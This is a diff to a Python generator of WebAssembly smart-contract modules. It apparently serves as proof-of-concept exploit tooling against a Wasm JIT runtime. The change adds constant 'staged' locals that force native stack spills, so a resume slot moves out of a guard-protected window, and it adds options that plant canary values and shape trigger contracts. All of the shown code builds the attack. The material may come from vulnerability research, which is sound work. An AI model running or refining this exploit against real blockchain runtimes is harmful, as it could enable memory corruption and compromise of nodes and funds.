@@ -48,17 +48,25 @@ ALLOCATOR = """  (global $heap (mut i32) (i32.const 8192))
   (func (export "interface_version_8"))"""
 
 
-def gen_holder(outdir, dummy=0, staged=10):
+def gen_holder(outdir, dummy=0, staged=10, staged_const=None):
     req = ('{"wasm":{"smart":{"contract_addr":"%s","msg":"e30="}}}' % TRIGGER_ADDR).encode()
     # staged locals; more locals => more spill pressure => a REAL native frame growth
     # (the resume slot moves deeper, out of the guard-protected top window)
     N = staged
     # staged local values, derived from $env (distinct per slot: 0x1000..0x1009)
-    staged = [
-        "(i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x%04x))"
-        % (0x1000 + i)
-        for i in range(N)
-    ]
+    if staged_const is not None:
+        # computed-to-exactly-C staged values (singlepass cannot fold the runtime AND),
+        # so the JIT still spills them into the native frame like the env-derived form.
+        staged = [
+            ("(i64.or (i64.const 0x%x) (i64.and (i64.extend_i32_u (local.get $env)) (i64.const 0)))" % staged_const)
+            for i in range(N)
+        ]
+    else:
+        staged = [
+            "(i64.or (i64.shl (i64.extend_i32_u (local.get $env)) (i64.const 32)) (i64.const 0x%04x))"
+            % (0x1000 + i)
+            for i in range(N)
+        ]
     # $hit = OR over (l_k != staged_k); fold right for a compact expression
     conds = [f"(i64.ne (local.get $l{k}) {staged[k]})" for k in range(N)]
     hit_expr = conds[-1]
@@ -286,6 +294,8 @@ def main():
                     help="number of holder staged locals (more => forced native frame growth)")
     ap.add_argument("--plant-values", default=None,
                     help="comma-separated per-slot canary values (hex), overrides --plants")
+    ap.add_argument("--staged-const", default=None,
+                    help="computed-to-constant staged local value (hex) for the holder")
     ap.add_argument("--then-val", default=None,
                     help="make the drift-site computed then-result evaluate to this exact 64-bit hex constant")
     args = ap.parse_args()
@@ -293,7 +303,8 @@ def main():
     call_kind = "query" if args.call_query else "db_read"
     pv = [int(x, 16) for x in args.plant_values.split(",")] if args.plant_values else None
     tv = int(args.then_val, 16) if args.then_val else None
-    gen_holder(args.outdir, args.dummy, args.staged)
+    sc = int(args.staged_const, 16) if args.staged_const else None
+    gen_holder(args.outdir, args.dummy, args.staged, sc)
     gen_trigger(args.outdir, args.offset, args.iters, args.dense, args.live, args.plants,
                 args.plant_addr, args.dense_tail, args.frame32, call_kind, pv, tv)
     gen_benign(args.outdir)
